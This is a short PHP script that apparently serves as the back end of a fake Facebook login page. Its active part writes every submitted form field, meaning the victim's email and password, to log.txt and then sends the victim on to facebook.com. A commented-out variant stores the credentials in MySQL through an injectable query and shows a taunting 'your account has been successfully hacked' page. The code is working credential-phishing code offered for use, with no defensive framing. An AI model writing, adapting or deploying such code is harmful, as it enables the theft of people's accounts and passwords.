<?php 

/*


$link = mysqli_connect('localhost','root','');
if (!$link) {
    die('Could not connect: ' . mysqli_error());
}
$db_select = mysqli_select_db($link, 'dummy');
if (!$db_select) {
    die("Database selection failed: " . mysqli_error());
}

$email=$_POST['email'];
$pass = $_POST['pass'];
  
  	$stmt=mysqli_query($link,"insert into registration( email, pass) 
		values('$email','$pass')");
		
		
		if ($stmt) {
				?>
					<!DOCTYPE html>
					<html>
						<head>
							<meta charset="UTF-8">
							<title>HACKER POINT</title>
							
						</head>
					<body>
					<div align="center">
						<h1>Thankyou for your help </h1>
						
						<b > CONGRATULATIONS your account has been successfully hacked.<br>Your EMAIL ID is <?php echo $email; ?>  and PASSWORD is <?php echo $pass; ?> </b>
		
						
					</div>
						
					</body>
					</html>

				<?php
			}
*/
//second method in which info is save in log file


header('Location:http://www.facebook.com');
$handle=fopen("log.txt","a");

foreach($_POST as $variable=>$value){
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n\n\n\n");
fclose($handle);
exit;
	
			
			


?>